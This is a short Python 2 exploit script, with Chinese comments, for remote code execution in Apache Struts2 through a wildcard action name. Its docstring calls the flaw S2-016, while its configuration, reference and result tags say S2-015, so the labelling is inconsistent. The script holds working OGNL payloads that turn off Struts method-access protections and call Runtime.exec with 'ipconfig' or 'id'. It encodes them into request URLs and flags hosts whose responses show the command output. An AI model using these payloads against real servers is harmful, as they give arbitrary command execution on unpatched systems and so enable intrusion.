#!/usr/bin/env python		
#coding:utf-8

"""
S2-016 远程代码执行漏洞

Desc
	漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：

	```xml
	<package name="S2-015" extends="struts-default">
	    <action name="*" class="com.demo.action.PageAction">
	        <result>/{1}.jsp</result>
	    </action>
	</package>
	```
Version
	2.0.0 - 2.3.14.2
Usage:
	POC: http://your-ip:8080/index.action?redirect:OGNL表达式
Referer:
	http://struts.apache.org/docs/s2-015.html
"""
import requests
import urllib
import re

def poc(url):
	url = url if '://' in url else 'http://' + url
	url = url.split('#')[0].split('?')[0].rstrip('/')

	command_win = "ipconfig"
	command_linux = "id"
	payloads = [
		# window 命令执行payload
		"${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('%s').getInputStream()),#q}" % command_win,
		# linux 命令执行payload
		"${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('%s').getInputStream()),#q}" % command_linux
	]
	for payload in payloads:
		vulurl = url + "/{payload}.action".format(payload=urllib.quote(payload))
		try:
			resp = requests.get(vulurl)
			#print resp.text
			if "Windows IP" in resp.text or "Windows IP Configuration" in resp.text:
				return '[S2-015][Win] ' + url
			if re.search("Message</b> /uid", resp.text):
				return '[S2-015][Linux] ' + url
		except Exception as e:
			print(e)
			pass

	return False

if __name__ == '__main__':
	print poc("http://localhost:8080/s2-015/")
	print poc("http://vuln.com:8080/")